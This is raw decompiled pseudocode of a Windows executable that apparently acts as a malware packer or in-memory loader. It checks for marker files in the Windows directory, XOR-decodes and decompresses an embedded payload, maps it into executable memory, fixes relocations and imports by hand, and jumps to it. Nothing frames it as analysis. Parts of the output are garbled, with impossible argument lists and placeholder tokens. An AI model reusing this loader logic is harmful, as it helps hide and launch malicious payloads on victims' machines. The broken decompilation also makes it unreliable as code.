int global11 = 0;
unsigned int global17 = 0;
__size32 global27 = 0;// 4 bytes
__size32 global58 = 0;// 4 bytes
unsigned int global73 = 0x4277;
__size32 global74 = 0x5600;// 4 bytes
__size32 global80 = 0;// 4 bytes
__size32 global83 = 0;// 4 bytes
__size32 global84 = 0;// 4 bytes
__size32 global85 = 0;// 4 bytes
int global87 = 0;

__size32 proc1(DWORD param1);
void proc2(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8);
void proc3(__size32 param1);
void proc4(__size32 param1);
__size8 proc5(__size32 param1, __size32 param2, int param3);
__size32 proc6(HANDLE param1, char *param2);
void proc7(__size32 param1);
__size32 proc8(unsigned int *param1, unsigned char *param2);

// address: 0x4010e0
void _start(char param1, unsigned char param2, __size32 param3, __size32 param4, __size32 param5) {
    __size32 eax; 		// r24
    __size32 eax_1; 		// r24{26}
    int ecx; 		// r25
    int edx; 		// r26
    __size32 *esp; 		// r28
    void *esp_1; 		// r28{193}
    void *esp_2; 		// r28{210}
    void *esp_3; 		// r28{314}
    void *local10; 		// esp_3{314}
    unsigned int local6; 		// m[esp - 8]

    lstrcpyA();
    eax_1 = GetModuleHandleA();
    LoadIconA(0, 0x7f00);
    GetWindowsDirectoryA();
    ecx = (param2);
    if (ecx == 58) {
        lstrcatA(&param1, "\hh.ex");
        lstrcatA(&param1, "e");
        eax = CreateFileA();
        if (eax != -1) {
            lstrcpyA();
            GetWindowsDirectoryA();
            eax = (param2);
            if (eax == 58) {
                lstrcatA(&param1, "\hCCXCXXAXAAh.exe");
                eax = CreateFileA();
                if (eax == -1) {
                    esp_1 = lstrcpyA();
                    local10 = esp_1;
                    local6 = 0;
                    esp_3 = local10;
                    while (local6 < global73) {
                        *(__size32*)(esp_3 - 4) = 0;
                        esp_2 = GetModuleHandleA();
                        local10 = esp_2;
                        eax = local6 + 0x424222;
                        ecx = *(eax + 8);
                        edx = local6 + 0x424222;
                        *(int*)(edx + 8) = ecx ^ 0xad9c;
                        local6 += 8;
                        esp_3 = local10;
                    }
                    *(__size32*)(esp_3 - 4) = global74;
                    eax = proc1(*(esp_3 - 4));
                    global80 = eax;
                    *(unsigned int*)(esp_3 - 4) = global73;
                    *(__size32*)(esp_3 - 8) = global80;
                    *(__size32*)(esp_3 - 12) = 0x42422a;
                    proc2(*(esp_3 - 184), *(esp_3 - 180), *(esp_3 - 48), *(esp_3 - 44), *(esp_3 - 32), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4));
                    global83 = param5;
                    global84 = param4;
                    global85 = param3;
                    ecx = *24;
                    global27 = ecx;
                    global87 = (esp - 4);
                    *(__size32*)(esp_3 - 4) = eax_1;
                    *(__size32*)(esp_3 - 8) = 0x401310 - eax_1;
                    esp = proc3(*(esp_3 - 4));
                    *(__size32*)(esp + 4) = global80;
                    proc4(*(esp + 4));
/* goto m[0x428640]*/
                }
                lstrcpyA();
            } else {
                lstrcpyA();
            }
        } else {
            lstrcpyA();
        }
    } else {
    }
    return;
}

// address: 0x4017b0
__size32 proc1(DWORD param1) {
    __size32 eax; 		// r24

    eax = VirtualAlloc(0, param1, 0x3000, 4);
    return eax;
}

// address: 0x401970
void proc2(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8) {
    unsigned char cl; 		// r9
    unsigned char cl_1; 		// r9{9}
    unsigned char dl; 		// r10
    unsigned char *eax; 		// r24
    unsigned int eax_1; 		// r24
    unsigned int eax_2; 		// r24{94}
    unsigned char *ecx; 		// r25
    unsigned char *edx; 		// r26
    int edx_1; 		// r26
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 12]
    unsigned int local1; 		// m[esp - 160]
    union { void * x49; int x50; } local10; 		// param2{223}
    unsigned int local11; 		// param1{224}
    unsigned int local12; 		// local3{229}
    union { void * x49; int x50; } local13; 		// local4{231}
    unsigned int local14; 		// local5{232}
    unsigned int local15; 		// local3{235}
    union { void * x49; int x50; } local16; 		// local4{237}
    unsigned int local17; 		// local5{238}
    unsigned int local2; 		// m[esp - 24]
    unsigned int local3; 		// m[esp - 28]
    union { void * x49; int x50; } local4; 		// m[esp - 164]
    unsigned int local5; 		// m[esp - 168]
    unsigned int local9; 		// param4{221}

    local0 = 1;
    cl_1 = *param6;
    lstrcpyA();
    local9 = param4;
    local10 = param2;
    local11 = param1;
    local2 = 0;
    do {
        param4 = local9;
        param2 = local10;
        param1 = local11;
        eax = param6 + local0;
        cl = *eax;
        local0++;
        local12 = param4;
        local13 = param2;
        local14 = param1;
        local15 = param4;
        local16 = param2;
        local17 = param1;
        if ((cl) != (cl_1)) {
            ecx = param7 + local2;
            *(unsigned char*)ecx = cl;
            local2++;
        } else {
            edx = param6 + local0;
            eax_1 = *(unsigned char*)edx;
            if (eax_1 != 0) {
                edx = param6 + local0;
                eax_1 = proc8(&param5, edx);
                eax_2 = eax_1 + local0;
                ecx = param6 + eax_2;
                local1 = ecx;
                local4 = esp - 32;
                eax_1 = proc8(&param3, ecx);
                local13 = local4;
                local14 = local5;
                local0 = eax_1 + eax_2;
                local3 = 0;
                local12 = local3;
                while (local3 < param5) {
                    edx_1 = local2 - param3;
                    eax = param7 + local2;
                    dl = *(param7 + edx_1);
                    *(unsigned char*)eax = dl;
                    local2++;
                    local3++;
                    local12 = local3;
                }
            } else {
                ecx = param7 + local2;
                *(unsigned char*)ecx = cl_1;
                local2++;
                local0++;
            }
            local3 = local12;
            local4 = local13;
            local5 = local14;
            local15 = local3;
            local16 = local4;
            local17 = local5;
        }
        local3 = local15;
        local4 = local16;
        local5 = local17;
        local9 = local3;
        local10 = local4;
        local11 = local5;
    } while (local0 < param8);
    return;
}

// address: 0x4017e0
void proc3(__size32 param1) {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int ecx; 		// r25
    __size32 edx; 		// r26
    __size32 edx_1; 		// r26{14}
    __size32 esi; 		// r30
    int esp; 		// r28
    __size32 local10; 		// m[esp - 4]

    edx_1 = param1 + *(param1 + 60);
    eax = GetModuleHandleA();
    eax = GetProcAddress(eax, "kernel32.dll"); /* Warning: also results in edx */
    ecx = *(edx_1 + 80);
    (*eax)(pc, 0, ecx, 0x3000, 64, 0x4285c8, esi, param1, eax, edx_1, ebp, param1, edx_1, ecx, edx, esp - 4, esi, ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1));
    global17 = eax;
    if (*0x428620 != 0) {
        edx = *(ebp - 16);
        eax = *(edx + 80);
        local10 = eax;
        ecx = *(ebp - 32);
        *(__size32*)(esp - 8) = ecx;
        edx = *0x428620;
        *(unsigned char **)(esp - 12) = edx;
        proc5(*(esp - 12), *(esp - 8), *(esp - 4));
        eax = global17 - *(ebp - 32);
        *(unsigned int*)(ebp - 24) = eax;
        ecx = *(ebp - 16);
        if (*(ecx + 164) != 0) {
            edx = *(ebp - 16);
            eax = *(ebp - 32);
            eax += *(edx + 160);
            *(unsigned int*)(ebp - 8) = eax;
            ecx = *(ebp - 8);
            while (*(ecx + 4) != 0) {
                edx = *(ebp - 8);
                eax = *(edx + 4);
                *(unsigned int*)(ebp - 12) = (eax - 8) / 2;
                ecx = *(ebp - 8);
                *(__size32*)(ebp - 28) = ecx + 8;
                *(__size32*)(ebp - 4) = 0;
L6:
                eax = *(ebp - 4);
                if (eax < *(ebp - 12)) {
                    ecx = *(ebp - 4);
                    edx = *(ebp - 28);
                    eax = *(unsigned short*)(edx + ecx * 2);
                    if ((int)eax >> 12 == 3) {
                        ecx = *(ebp - 8);
                        edx = global17 + *ecx;
                        eax = *(ebp - 4);
                        ecx = *(ebp - 28);
                        eax = *(unsigned short*)(ecx + eax * 2);
                        ecx = *(edx + (eax & 0xfff));
                        ecx += *(ebp - 24);
                        edx = *(ebp - 4);
                        eax = *(ebp - 28);
                        edx = *(unsigned short*)(eax + edx * 2);
                        eax = *(ebp - 8);
                        esi = global17 + *eax;
                        *(unsigned int*)(esi + (edx & 0xfff)) = ecx;
                    }
                    edx = *(ebp - 4);
                    *(__size32*)(ebp - 4) = edx + 1;
                    goto L6;
                }
                ecx = *(ebp - 8);
                edx = *(ebp - 8);
                edx += *(ecx + 4);
                *(__size32*)(ebp - 8) = edx;
                ecx = *(ebp - 8);
            }
        }
        edx = *(ebp + 8);
/* goto edx + global17*/
    }
    return;
}

// address: 0x401370
void proc4(__size32 param1) {
    __size8 cl; 		// r9
    __size32 eax; 		// r24
    unsigned int eax_1; 		// r24
    HANDLE eax_2; 		// r24{12}
    __size32 eax_3; 		// r24{240}
    __size32 eax_4; 		// r24{271}
    __size32 ebp; 		// r29
    int ecx; 		// r25
    __size32 ecx_1; 		// r25{129}
    __size32 ecx_2; 		// r25{241}
    int edx; 		// r26
    __size32 edx_1; 		// r26{276}
    int esp; 		// r28
    void *esp_1; 		// r28{150}
    void *esp_2; 		// r28{263}
    void *esp_3; 		// r28{285}
    void *esp_4; 		// r28{414}
    void *esp_5; 		// r28{426}
    void *esp_6; 		// r28{564}
    void *esp_7; 		// r28{582}
    HANDLE local0; 		// m[esp - 224]
    char *local1; 		// m[esp - 220]
    __size32 local10; 		// m[esp - 252]
    int local11; 		// m[esp - 240]
    int local12; 		// m[esp - 232]
    int local13; 		// m[esp - 224]
    int local14; 		// m[esp - 216]
    int local15; 		// m[esp - 212]
    int local16; 		// m[esp - 208]
    __size32 local17; 		// m[esp - 200]
    HANDLE local18; 		// m[esp - 196]
    __size32 local19; 		// m[esp - 72]
    HANDLE local2; 		// m[esp - 232]
    __size32 local20; 		// m[esp - 68]
    __size32 local21; 		// m[esp - 64]
    __size32 local22; 		// m[esp - 48]
    __size32 local23; 		// m[esp - 40]
    __size32 local24; 		// m[esp - 24]
    __size32 local25; 		// m[esp - 20]
    int local26; 		// m[esp - 12]
    __size32 local27; 		// m[esp - 8]
    __size32 local28; 		// m[esp - 4]
    __size32 local29; 		// m[esp + 4]
    char *local3; 		// m[esp - 228]
    int local30; 		// m[esp + 4]{150}
    int local31; 		// m[esp + 4]{708}
    unsigned int local32; 		// m[esp_4 - 8]{492}
    unsigned char *local33; 		// m[esp_4 - 8]{500}
    int local34; 		// m[esp - 4]{150}
    int local35; 		// m[esp - 4]{263}
    int local36; 		// m[esp - 8]{150}
    int local37; 		// m[esp - 8]{263}
    int local38; 		// m[esp - 12]{150}
    int local39; 		// m[esp - 12]{263}
    HANDLE local4; 		// m[esp - 240]
    int local40; 		// m[esp - 20]{150}
    int local41; 		// m[esp - 20]{263}
    int local42; 		// m[esp - 24]{150}
    int local43; 		// m[esp - 24]{263}
    int local44; 		// m[esp - 40]{150}
    int local45; 		// m[esp - 40]{263}
    int local46; 		// m[esp - 48]{150}
    int local47; 		// m[esp - 48]{263}
    int local48; 		// m[esp - 64]{150}
    int local49; 		// m[esp - 64]{263}
    char *local5; 		// m[esp - 236]
    int local50; 		// m[esp - 68]{150}
    int local51; 		// m[esp - 68]{263}
    int local52; 		// m[esp - 72]{150}
    int local53; 		// m[esp - 72]{263}
    int local54; 		// m[esp - 196]{150}
    int local55; 		// m[esp - 196]{263}
    int local56; 		// m[esp - 200]{150}
    int local57; 		// m[esp - 200]{263}
    int local58; 		// m[esp - 208]{150}
    int local59; 		// m[esp - 208]{263}
    HANDLE local6; 		// m[esp - 248]
    int local60; 		// m[esp - 212]{150}
    int local61; 		// m[esp - 212]{263}
    int local62; 		// m[esp - 216]{150}
    int local63; 		// m[esp - 216]{263}
    int local64; 		// m[esp - 220]{150}
    int local65; 		// m[esp - 220]{263}
    int local66; 		// m[esp - 224]{150}
    int local67; 		// m[esp - 224]{263}
    int local68; 		// m[esp - 228]{150}
    int local69; 		// m[esp - 228]{263}
    char *local7; 		// m[esp - 244]
    int local70; 		// m[esp - 232]{150}
    int local71; 		// m[esp - 232]{263}
    int local72; 		// m[esp - 236]{150}
    int local73; 		// m[esp - 236]{263}
    int local74; 		// m[esp - 240]{150}
    int local75; 		// m[esp - 240]{263}
    int local76; 		// m[esp - 244]{150}
    int local77; 		// m[esp - 244]{263}
    int local78; 		// m[esp - 248]{150}
    int local79; 		// m[esp - 248]{263}
    unsigned int local8; 		// m[esp - 260]
    int local80; 		// m[esp - 252]{150}
    int local81; 		// m[esp - 252]{263}
    int local82; 		// m[esp - 256]{150}
    int local83; 		// m[esp - 256]{263}
    int local84; 		// m[esp - 260]{150}
    int local85; 		// m[esp - 260]{263}
    int local86; 		// m[esp - 188]
    void *local87; 		// esp_6{564}
    int local9; 		// m[esp - 256]

    eax_2 = GetModuleHandleA();
    lstrcpyA();
    GetProcAddress(eax_2, "UnmapViewOfFile");
    eax = GetProcAddress(eax_2, "CreateFileMappingA");
    eax = GetProcAddress(eax_2, "VirtualAlloc");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "LoadLibraryA");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "MapViewOfFileEx");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "VirtualFree");
    eax = GetProcAddress(eax_2, "UnmapViewOfFile");
    ecx_1 = param1 + *(param1 + 60);
    eax = *(unsigned short*)(ecx_1 + 20);
    ecx = *(ecx_1 + 80);
    (*eax)(pc, 0, ecx, 0x3000, 64, (esp - 188), 0x4285a0, esp - 188, 0x428588, esp - 188, 0x42856c, esp - 188, 0x428524, 0x428514, param1, eax_2, eax, ecx_1, eax, ecx_1 + eax + 24, eax, eax, eax, 0, eax, ebp, param1, ecx_1, ecx, ecx_1 + eax + 24, esp - 4, ADDFLAGS32(param1, *(param1 + 60), ecx_1), ADDFLAGS32(param1, *(param1 + 60), ecx_1), ADDFLAGS32(param1, *(param1 + 60), ecx_1));
    *(__size32*)(ebp - 52) = eax;
    edx = *(ebp - 196);
    eax = *(edx + 60);
    ecx = *(ebp - 64);
    edx = *(unsigned short*)(ecx + 6);
    *(__size32*)(esp_1 - 4) = eax + edx * 40 + 312;
    ecx = *(ebp + 8);
    *(__size32*)(esp_1 - 8) = ecx;
    edx = *(ebp - 52);
    *(unsigned char **)(esp_1 - 12) = edx;
    cl = proc5(*(esp_1 - 12), *(esp_1 - 8), *(esp_1 - 4));
    *(__size32*)(ebp - 12) = 0;
    ecx = *(ebp - 64);
    edx = *(unsigned short*)(ecx + 6);
    while (*(ebp - 12) < edx) {
        eax = *(ebp - 44);
        if (*(eax + 20) != 0) {
            ecx = *(ebp - 44);
            if (*(ecx + 16) != 0) {
                edx = *(ebp - 44);
                eax = *(edx + 16);
                ecx = *(ebp - 64);
                edx = *(ecx + 60);
                ecx = *(ebp - 64);
                tmpl = (eax + edx - 1);
                tmp2 = *(ecx + 60);
                edx = *(ebp - 64);
                eax = *(edx + 60) * tmpl / tmp2;
                *(int*)(esp_1 - 4) = eax;
                eax = *(ebp - 44);
                ecx = *(ebp + 8);
                ecx += *(eax + 20);
                *(__size32*)(esp_1 - 8) = ecx;
                edx = *(ebp - 44);
                eax = *(ebp - 52);
                eax += *(edx + 12);
                *(__size32*)(esp_1 - 12) = eax;
                cl = proc5(*(esp_1 - 12), *(esp_1 - 8), *(esp_1 - 4));
            }
        }
        ecx = *(ebp - 44);
        *(__size32*)(ebp - 44) = ecx + 40;
        eax = *(ebp - 12);
        *(__size32*)(ebp - 12) = eax + 1;
        ecx = *(ebp - 64);
        edx = *(unsigned short*)(ecx + 6);
    }
    edx = *(ebp - 52);
    *(__size32*)(ebp - 196) = edx;
    eax_3 = *(ebp - 196);
    ecx_2 = *(ebp - 196);
    ecx = ecx_2 + *(eax_3 + 60);
    *(__size32*)(ebp - 64) = ecx;
    *(__size32*)(esp_1 - 4) = 0;
    edx = *(ebp - 64);
    eax = *(edx + 80);
    *(__size32*)(esp_1 - 8) = eax;
    *(__size32*)(esp_1 - 12) = 0;
    *(__size32*)(esp_1 - 16) = 4;
    *(__size32*)(esp_1 - 20) = 0;
    *(__size32*)(esp_1 - 24) = -1;
    (**(ebp - 4))(local84, local82, local80, local78, local76, local74, local72, local70, local68, local66, local64, local62, local60, local58, local56, local54, local52, local50, local48, local46, local44, local42, local40, local38, local36, local34, local30, cl, eax, ecx, edx, ebp, <all>, ADDFLAGS32(ecx_2, *(eax_3 + 60), ecx), ADDFLAGS32(ecx_2, *(eax_3 + 60), ecx), ADDFLAGS32(ecx_2, *(eax_3 + 60), ecx));
    local87 = esp_2;
    *(__size32*)(ebp - 8) = eax;
    ecx = *(ebp - 64);
    edx = *(ebp - 52);
    edx += *(ecx + 128);
    *(__size32*)(ebp - 200) = edx;
    esp_6 = local87;
    eax_4 = *(ebp - 200);
    tmp1 = *(eax_4 + 16);
    while (*(eax_4 + 16) != 0) {
        ecx = *(ebp - 200);
        edx_1 = *(ebp - 52);
        edx = edx_1 + *(ecx + 12);
        *(__size32*)(esp_6 - 4) = edx;
        (**(ebp - 36))(local85, local83, local81, local79, local77, local75, local73, local71, local69, local67, local65, local63, local61, local59, local57, local55, local53, local51, local49, local47, local45, local43, local41, local39, local37, local35, local31, cl, eax_4, ecx, edx, ebp, <all>, ADDFLAGS32(edx_1, *(ecx + 12), edx), ADDFLAGS32(edx_1, *(ecx + 12), edx), ADDFLAGS32(edx_1, *(ecx + 12), edx));
        *(__size32*)(ebp - 28) = eax;
        eax = *(ebp - 200);
        if (*eax == 0) {
            edx = *(ebp - 200);
            eax = *(ebp - 52);
            eax += *(edx + 16);
            *(__size32*)(ebp - 40) = eax;
            ecx = *(ebp - 200);
            edx = *(ebp - 52);
            edx += *ecx;
            *(__size32*)(ebp - 56) = edx;
        } else {
            ecx = *(ebp - 200);
            edx = *(ebp - 52);
            edx += *ecx;
            *(__size32*)(ebp - 40) = edx;
            eax = *(ebp - 200);
            ecx = *(ebp - 52);
            ecx += *(eax + 16);
            *(__size32 **)(ebp - 56) = ecx;
        }
        *(__size32*)(ebp - 24) = 0;
        eax = *(ebp - 200);
        if (*(eax + 16) != 0) {
            ecx = *(ebp - 200);
            if (*ecx != 0) {
                *(__size32*)(ebp - 24) = 1;
            }
        }
L25:
        esp_7 = esp_3;
        edx = *(ebp - 40);
        local87 = esp_7;
        if (*edx != 0) {
            eax = *(ebp - 40);
            ecx = *eax;
            if ((ecx & 0x80000000) == 0) {
                eax = *(ebp - 40);
                ecx = *eax;
                edx = *(ebp - 52);
                *(__size32*)(esp_3 - 4) = ecx + edx + 2;
                ecx = *(ebp - 28);
                *(__size32*)(esp_3 - 8) = ecx;
                eax = proc6(*(esp_3 - 8), *(esp_3 - 4));
                edx = *(ebp - 40);
                *(__size32 **)edx = eax;
            } else {
                edx = *(ebp - 40);
                eax = *edx;
                *(int*)(esp_3 - 4) = eax & 0x7fffffff;
                ecx = *(ebp - 28);
                *(__size32*)(esp_3 - 8) = ecx;
                eax = proc6(*(esp_3 - 8), *(esp_3 - 4));
                edx = *(ebp - 40);
                *(__size32 **)edx = eax;
            }
            if (*(ebp - 24) != 0) {
                eax = *(ebp - 56);
                ecx = *(ebp - 40);
                edx = *ecx;
                *(__size32*)eax = edx;
            }
            eax = *(ebp - 40);
            *(__size32*)(ebp - 40) = eax + 4;
            ecx = *(ebp - 56);
            *(__size32*)(ebp - 56) = ecx + 4;
            goto L25;
        }
        edx = *(ebp - 200);
        *(__size32*)(ebp - 200) = edx + 20;
        esp_6 = local87;
        eax_4 = *(ebp - 200);
        tmp1 = *(eax_4 + 16);
    }
    eax = *(ebp - 64);
    ecx = *(eax + 52);
    *(__size32*)(esp_6 - 4) = ecx;
    *(__size32*)(esp_6 - 8) = 0;
    *(__size32*)(esp_6 - 12) = 0;
    *(__size32*)(esp_6 - 16) = 0;
    *(__size32*)(esp_6 - 20) = 34;
    edx = *(ebp - 8);
    *(__size32*)(esp_6 - 24) = edx;
    (**(ebp - 20))(local85, local83, local81, local79, local77, local75, local73, local71, local69, local67, local65, local63, local61, local59, local57, local55, local53, local51, local49, local47, local45, local43, local41, local39, local37, local35, local31, cl, eax, ecx, edx, ebp, <all>, SUBFLAGS32(*(eax_4 + 16), 0, tmp1), tmp1 == 0, *(eax_4 + 16) < 0);
    global17 = eax;
    if (*0x428620 != 0) {
L4:
        edx = *(ebp - 8);
        *(__size32*)(esp_4 - 4) = edx;
        CloseHandle(*(esp_4 - 4));
        eax = *(ebp - 64);
        ecx = *(eax + 80);
        *(__size32*)(esp_4 - 4) = ecx;
        edx = *(ebp - 52);
        local33 = edx;
        *(__size32*)(esp_4 - 12) = global17;
        proc5(*(esp_4 - 12), *(esp_4 - 8), *(esp_4 - 4));
        *(__size32*)(esp_4 - 4) = global17;
        proc7(*(esp_4 - 4));
        edx = *(ebp - 64);
        eax = global17 + *(edx + 40);
        global58 = eax;
        ecx = *(ebp - 64);
        *(__size32*)(ecx + 40) = global58;
    } else {
        eax = *(ebp - 64);
        ecx = *(eax + 52);
        *(__size32*)(esp_4 - 4) = ecx;
        (**(ebp - 60))(local8, local9, local10, local6, local7, local4, local5, local2, local3, local0, local1, local14, local15, local16, local17, local18, local19, local20, local21, local22, local23, local24, local25, local26, local27, local28, local29, cl, eax, ecx, edx, ebp, <all>, SUBFLAGS32(global17, 0, global17), global17 == 0, global17 < 0);
        if (eax != 0) {
L8:
            ecx = *(ebp - 64);
            edx = *(ecx + 52);
            *(__size32*)(esp_5 - 4) = edx;
            *(__size32*)(esp_5 - 8) = 0;
            *(__size32*)(esp_5 - 12) = 0;
            *(__size32*)(esp_5 - 16) = 0;
            *(__size32*)(esp_5 - 20) = 34;
            eax = *(ebp - 8);
            *(__size32*)(esp_5 - 24) = eax;
            eax = MapViewOfFileEx(); /* Warning: also results in esp_4 */
            global17 = eax;
            if (*0x428620 == 0) {
                *(__size32*)(esp_5 - 28) = 64;
                *(__size32*)(esp_5 - 32) = 0x3000;
                ecx = *(ebp - 64);
                edx = *(ecx + 80);
                *(__size32*)(esp_5 - 36) = edx;
                eax = *(ebp - 64);
                ecx = *(eax + 52);
                *(__size32*)(esp_5 - 40) = ecx;
                eax = VirtualAlloc(*(esp_5 - 40), *(esp_5 - 36), *(esp_5 - 32), *(esp_5 - 28)); /* Warning: also results in esp_4 */
                global17 = eax;
                goto L4;
            }
            goto L4;
        } else {
            *(__size32*)(esp_5 - 4) = 0x8000;
            *(__size32*)(esp_5 - 8) = 0;
            edx = *(ebp - 64);
            eax = *(edx + 52);
            *(__size32*)(esp_5 - 12) = eax;
            eax = VirtualFree(*(esp_5 - 12), *(esp_5 - 8), *(esp_5 - 4));
            if (eax != 0) {
                goto L8;
            } else {
            }
        }
    }
    return;
}

// address: 0x401040
__size8 proc5(__size32 param1, __size32 param2, int param3) {
    unsigned char cl; 		// r9
    unsigned char *eax; 		// r24
    unsigned char *edx; 		// r26

    global11 = 0;
    while (global11 < param3) {
        edx = param1 + global11;
        eax = param2 + global11;
        cl = *eax;
        *(unsigned char*)edx = cl;
        global11++;
    }
    return (unsigned char) global11;
}

// address: 0x401350
__size32 proc6(HANDLE param1, char *param2) {
    __size32 eax; 		// r24

    eax = GetProcAddress(param1, param2);
    return eax;
}

// address: 0x401940
void proc7(__size32 param1) {
    __size32 eax; 		// r24

    eax = *(global27 + 48);
    *(__size32*)(eax + 8) = param1;
    return;
}

// address: 0x401a90
__size32 proc8(unsigned int *param1, unsigned char *param2) {
    unsigned int edx; 		// r26
    unsigned int edx_1; 		// r26{19}
    unsigned int local0; 		// m[esp - 8]
    __size32 local1; 		// m[esp - 16]
    unsigned char *local2; 		// m[esp + 8]
    unsigned int local3; 		// m[esp - 20]
    unsigned char *local4; 		// param2{63}

    local0 = 0;
    local1 = 0;
    lstrcpyA();
    local4 = param2;
    do {
        param2 = local4;
        edx_1 = *(unsigned char*)param2;
        local2 = param2 + 1;
        local3 = local0 * 128;
        edx = edx_1 & 0x7f | local3;
        local0 = edx;
        local1++;
        local4 = local2;
    } while ((edx_1 & 0x80) != 0);
    *(unsigned int*)param1 = edx;
    return local1;
}

